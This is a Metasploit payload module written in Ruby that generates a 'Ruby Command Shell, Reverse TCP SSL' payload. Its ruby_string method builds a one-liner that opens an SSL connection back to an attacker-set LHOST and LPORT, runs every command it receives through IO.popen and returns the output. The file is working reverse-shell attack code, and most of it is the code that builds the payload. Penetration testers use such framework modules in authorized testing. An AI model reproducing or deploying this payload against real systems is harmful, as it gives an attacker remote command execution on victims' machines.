##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/ruby'
require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 444

  include Msf::Payload::Single
  include Msf::Payload::Ruby
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Ruby Command Shell, Reverse TCP SSL',
      'Description' => 'Connect back and create a command shell via Ruby, uses SSL',
      'Author'      => 'RageLtMan <rageltman[at]sempervictus>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'ruby',
      'Arch'        => ARCH_RUBY,
      'Handler'     => Msf::Handler::ReverseTcpSsl,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'ruby',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    rbs = prepends(ruby_string)
    vprint_good rbs
    return rbs
  end

  def ruby_string
    lhost = datastore['LHOST']
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    rbs = "require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"#{lhost}\","
    rbs << "\"#{datastore['LPORT']}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end"
    return rbs
  end
end
